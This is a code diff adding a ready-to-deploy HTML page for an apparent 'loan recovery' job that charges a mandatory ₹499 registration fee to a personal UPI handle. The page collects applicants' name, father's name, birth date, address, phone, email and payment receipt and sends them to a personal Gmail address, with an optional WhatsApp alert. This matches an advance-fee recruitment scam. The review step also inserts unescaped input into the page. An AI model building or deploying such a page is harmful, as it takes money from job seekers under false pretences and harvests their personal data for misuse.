@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Recovery Job - Payment & Review</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { font-family: 'Poppins', sans-serif; }
+        .step { transition: all 0.3s ease; }
+        .required-star::after { content: " *"; color: #f97316; }
+        .error-border { border-color: #ef4444 !important; background: #fef2f2; }
+        .btn-glow { box-shadow: 0 0 12px #f97316; transition: 0.2s; }
+        .btn-glow:hover { transform: scale(1.02); }
+        .qr-card { background: #fff5e6; border: 2px dashed #f97316; }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-blue-900 via-purple-800 to-orange-600 min-h-screen py-8 px-4">
+
+    <div class="max-w-3xl mx-auto">
+        <!-- Header (common) -->
+        <div class="bg-white/95 backdrop-blur rounded-2xl p-5 text-center shadow-xl mb-6">
+            <i class="fas fa-file-invoice-dollar text-5xl text-orange-500"></i>
+            <h1 class="text-3xl font-extrabold text-gray-800">Bank Loan Recovery Telecom</h1>
+            <p class="text-gray-600">Registration Fee ₹499 (Mandatory)</p>
+        </div>
+
+        <!-- STEP 1: FORM PAGE -->
+        <div id="step1" class="step bg-white rounded-2xl shadow-2xl overflow-hidden">
+            <div class="bg-gradient-to-r from-orange-500 to-red-600 px-6 py-4">
+                <h2 class="text-white text-xl font-bold"><i class="fas fa-credit-card"></i> Step 1: Fill Details & Pay</h2>
+                <p class="text-white/80 text-sm">Pay ₹499, upload receipt, then click "Preview & Confirm"</p>
+            </div>
+            <form id="mainForm" class="p-6 space-y-4">
+                <!-- Personal fields -->
+                <div><label class="font-semibold required-star">Full Name</label><input type="text" id="fullName" required class="w-full p-3 border rounded-xl"></div>
+                <div><label class="font-semibold required-star">Father's Name</label><input type="text" id="fatherName" required class="w-full p-3 border rounded-xl"></div>
+                <div><label class="font-semibold required-star">Date of Birth</label><input type="date" id="dob" required class="w-full p-3 border rounded-xl"></div>
+                <div><label class="font-semibold required-star">Mobile Number</label><input type="tel" id="mobile" required pattern="[0-9]{10}" class="w-full p-3 border rounded-xl"></div>
+                <div><label class="font-semibold required-star">Email Address</label><input type="email" id="email" required class="w-full p-3 border rounded-xl"></div>
+                <div><label class="font-semibold required-star">Full Address (with PIN)</label><textarea id="address" required rows="2" class="w-full p-3 border rounded-xl"></textarea></div>
+                
+                <!-- Qualification with Other -->
+                <div><label class="font-semibold required-star">Highest Qualification</label>
+                    <select id="qualification" required class="w-full p-3 border rounded-xl">
+                        <option value="">-- Select --</option>
+                        <option>10th Pass</option><option>12th Pass</option><option>Graduate</option>
+                        <option>Post Graduate</option><option>Diploma</option><option value="other">Other</option>
+                    </select>
+                    <div id="otherDiv" class="hidden mt-2"><input type="text" id="otherQual" class="w-full p-3 border rounded-xl" placeholder="Specify qualification"></div>
+                </div>
+                <div><label class="font-semibold required-star">Experience (Recovery/Banking/Telecom)</label>
+                    <select id="experience" required class="w-full p-3 border rounded-xl">
+                        <option value="">-- Select --</option>
+                        <option>No Experience</option><option>Less than 1 year</option><option>1-3 years</option><option>3-5 years</option><option>5+ years</option>
+                    </select>
+                </div>
+
+                <!-- Payment QR & Receipt -->
+                <div class="qr-card rounded-xl p-4">
+                    <label class="font-bold"><i class="fab fa-google-pay"></i> Pay ₹499 via QR / UPI</label>
+                    <div class="flex flex-col md:flex-row gap-4 items-center mt-2">
+                        <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=UPI%3A%20mddilshad%40okhdfcbank%3Famount%3D499%26name%3DLoan%20Recovery" class="w-32 h-32 border rounded-lg bg-white">
+                        <div><p class="text-sm">Scan QR or pay to: <span class="font-mono bg-gray-200 px-2 py-1 rounded">mddilshad@okhdfcbank</span></p><p class="text-xs text-red-600">*After payment, take screenshot & upload below</p></div>
+                    </div>
+                </div>
+                <div><label class="font-semibold required-star">Payment Receipt (Screenshot)</label><input type="file" id="receipt" accept="image/*" required class="w-full p-2 border-2 border-orange-300 rounded-xl"></div>
+                <div class="flex items-start gap-2"><input type="checkbox" id="declaration" required><label class="text-sm">I confirm all details and receipt is genuine <span class="text-orange-500">*</span></label></div>
+                <button type="button" id="previewBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl btn-glow text-lg"><i class="fas fa-eye"></i> Preview & Confirm Details</button>
+                <div id="step1Error" class="text-red-600 text-sm text-center hidden"></div>
+            </form>
+        </div>
+
+        <!-- STEP 2: REVIEW PAGE (hidden initially) -->
+        <div id="step2" class="step bg-white rounded-2xl shadow-2xl overflow-hidden hidden">
+            <div class="bg-gradient-to-r from-green-600 to-teal-600 px-6 py-4">
+                <h2 class="text-white text-xl font-bold"><i class="fas fa-check-double"></i> Step 2: Verify Your Details</h2>
+                <p class="text-white/80 text-sm">Check all fields. Edit if needed, then Submit.</p>
+            </div>
+            <div class="p-6 space-y-4">
+                <div id="reviewContent" class="bg-gray-50 p-4 rounded-xl space-y-2 text-sm"></div>
+                <div class="flex gap-3">
+                    <button id="editBtn" class="bg-yellow-500 hover:bg-yellow-600 text-white px-4 py-2 rounded-lg"><i class="fas fa-edit"></i> Edit Details</button>
+                    <button id="finalSubmitBtn" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg flex-1"><i class="fas fa-paper-plane"></i> Confirm & Submit</button>
+                </div>
+                <div id="step2Status" class="text-center text-sm font-semibold hidden p-2 rounded-lg"></div>
+            </div>
+        </div>
+
+        <div class="text-center text-white/70 text-xs mt-6"><i class="fas fa-shield-alt"></i> Data sent to recruitment team after confirmation</div>
+    </div>
+
+    <script>
+        // DOM elements
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const previewBtn = document.getElementById('previewBtn');
+        const editBtn = document.getElementById('editBtn');
+        const finalSubmitBtn = document.getElementById('finalSubmitBtn');
+        const step1Error = document.getElementById('step1Error');
+
+        // Helper: show/hide error
+        function showError(msg) { step1Error.textContent = msg; step1Error.classList.remove('hidden'); setTimeout(() => step1Error.classList.add('hidden'), 4000); }
+
+        // Validate Step1 fields, collect data, show review
+        previewBtn.onclick = () => {
+            // Check declaration
+            if (!document.getElementById('declaration').checked) { showError("Please accept declaration"); return; }
+            // Check receipt file
+            const receiptFile = document.getElementById('receipt').files[0];
+            if (!receiptFile) { showError("Payment receipt upload is mandatory"); return; }
+            // Gather all values
+            let fullName = document.getElementById('fullName').value.trim();
+            let father = document.getElementById('fatherName').value.trim();
+            let dob = document.getElementById('dob').value;
+            let mobile = document.getElementById('mobile').value.trim();
+            let email = document.getElementById('email').value.trim();
+            let address = document.getElementById('address').value.trim();
+            let qualSelect = document.getElementById('qualification').value;
+            let otherQual = document.getElementById('otherQual').value.trim();
+            let experience = document.getElementById('experience').value;
+
+            if (!fullName || !father || !dob || !mobile || !email || !address || !qualSelect || !experience) {
+                showError("All required fields must be filled"); return;
+            }
+            if (mobile.length !== 10) { showError("Mobile must be 10 digits"); return; }
+            if (!email.includes('@')) { showError("Valid email required"); return; }
+            if (qualSelect === 'other' && !otherQual) { showError("Please specify other qualification"); return; }
+            let finalQual = qualSelect === 'other' ? `Other: ${otherQual}` : qualSelect;
+
+            // Store data globally for final submit
+            window.tempData = { fullName, father, dob, mobile, email, address, qualification: finalQual, experience, receiptFile };
+            // Show review page
+            const reviewDiv = document.getElementById('reviewContent');
+            reviewDiv.innerHTML = `
+                <p><strong>📛 Full Name:</strong> ${fullName}</p>
+                <p><strong>👨 Father's Name:</strong> ${father}</p>
+                <p><strong>🎂 DOB:</strong> ${dob}</p>
+                <p><strong>📞 Mobile:</strong> ${mobile}</p>
+                <p><strong>✉️ Email:</strong> ${email}</p>
+                <p><strong>🏠 Address:</strong> ${address}</p>
+                <p><strong>🎓 Qualification:</strong> ${finalQual}</p>
+                <p><strong>💼 Experience:</strong> ${experience}</p>
+                <p><strong>🧾 Payment Receipt:</strong> ${receiptFile.name} (uploaded)</p>
+                <hr class="my-2"><p class="text-green-600">✅ Please confirm if all details are correct.</p>
+            `;
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        };
+
+        // Edit button: go back to step1
+        editBtn.onclick = () => {
+            step2.classList.add('hidden');
+            step1.classList.remove('hidden');
+        };
+
+        // Final Submit: send email + WhatsApp
+        async function fileToBase64(file) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+            });
+        }
+
+        finalSubmitBtn.onclick = async () => {
+            const data = window.tempData;
+            if (!data) return;
+            const receiptBase64 = await fileToBase64(data.receiptFile);
+            const messageText = `🔔 NEW JOB APPLICATION (PAID ₹499)\nName: ${data.fullName}\nFather: ${data.father}\nDOB: ${data.dob}\nMobile: ${data.mobile}\nEmail: ${data.email}\nAddress: ${data.address}\nQualification: ${data.qualification}\nExperience: ${data.experience}\nReceipt: attached (base64)`;
+
+            // 1. Email via FormSubmit
+            const emailForm = new FormData();
+            emailForm.append('full_name', data.fullName);
+            emailForm.append('mobile', data.mobile);
+            emailForm.append('email', data.email);
+            emailForm.append('details', messageText);
+            emailForm.append('_subject', '✅ Paid Registration - Loan Recovery');
+            emailForm.append('_captcha', 'false');
+            emailForm.append('receipt_base64', receiptBase64);
+            emailForm.append('receipt_filename', data.receiptFile.name);
+
+            let emailOk = false;
+            try {
+                const res = await fetch('https://formsubmit.co/ajax/mddilshadbilal@gmail.com', { method: 'POST', body: emailForm });
+                if (res.ok) emailOk = true;
+            } catch(e) { console.log(e); }
+
+            // 2. WhatsApp (optional - replace with your number & API key if needed)
+            let whatsappOk = false;
+            const adminNumber = "919876543210"; // CHANGE THIS to your WhatsApp number with country code (e.g., 9198xxxxxx)
+            const apiKey = "123456"; // CHANGE THIS after getting from callmebot.com
+            if (adminNumber !== "919876543210" && apiKey !== "123456") {
+                const waMsg = `New+Paid+Registration%0AName:${data.fullName}%0AMobile:${data.mobile}`;
+                try {
+                    const waRes = await fetch(`https://api.callmebot.com/whatsapp.php?phone=${adminNumber}&text=${waMsg}&apikey=${apiKey}`);
+                    if (waRes.ok) whatsappOk = true;
+                } catch(e) {}
+            }
+
+            // Show success message on step2
+            const statusDiv = document.getElementById('step2Status');
+            statusDiv.classList.remove('hidden');
+            if (emailOk) {
+                statusDiv.innerHTML = '<span class="text-green-700">✅ Application submitted successfully! Data sent to recruitment team. We will contact you soon.</span>';
+                statusDiv.classList.add('bg-green-100', 'text-green-800');
+                // Optionally reset everything after 3 seconds and show step1
+                setTimeout(() => {
+                    step2.classList.add('hidden');
+                    step1.classList.remove('hidden');
+                    document.getElementById('mainForm').reset();
+                    document.getElementById('otherDiv').classList.add('hidden');
+                    document.getElementById('receipt').value = '';
+                    document.getElementById('declaration').checked = false;
+                    statusDiv.classList.add('hidden');
+                }, 4000);
+            } else {
+                statusDiv.innerHTML = '<span class="text-red-700">❌ Submission failed. Please try again.</span>';
+                statusDiv.classList.add('bg-red-100', 'text-red-800');
+            }
+        };
+
+        // Other qualification show/hide
+        const qualSelect = document.getElementById('qualification');
+        const otherDiv = document.getElementById('otherDiv');
+        qualSelect.addEventListener('change', () => {
+            otherDiv.classList.toggle('hidden', qualSelect.value !== 'other');
+        });
+        // Mobile number restriction
+        document.getElementById('mobile').addEventListener('input', function(e) { this.value = this.value.replace(/[^0-9]/g, '').slice(0,10); });
+    </script>
+
+    <!-- Note for WhatsApp setup (visible to admin only) -->
+    <div class="max-w-3xl mx-auto mt-4 bg-amber-100 border-l-4 border-amber-500 p-3 text-xs text-gray-700 rounded">
+        <p class="font-bold">📌 WhatsApp Notification Setup (optional):</p>
+        <p>1. Visit <a href="https://www.callmebot.com/blog/free-whatsapp-api/" target="_blank" class="text-blue-600">CallMeBot</a> and get your API key.<br>
+        2. Replace <strong>adminNumber</strong> (e.g., 9198xxxxxx) and <strong>apiKey</strong> in the code above.<br>
+        3. Without this, only EMAIL will work (email will go to mddilshadbilal@gmail.com).</p>
+        <p>🔹 QR code image URL can be changed in line ~80 (img src).</p>
+    </div>
+</body>
+</html>
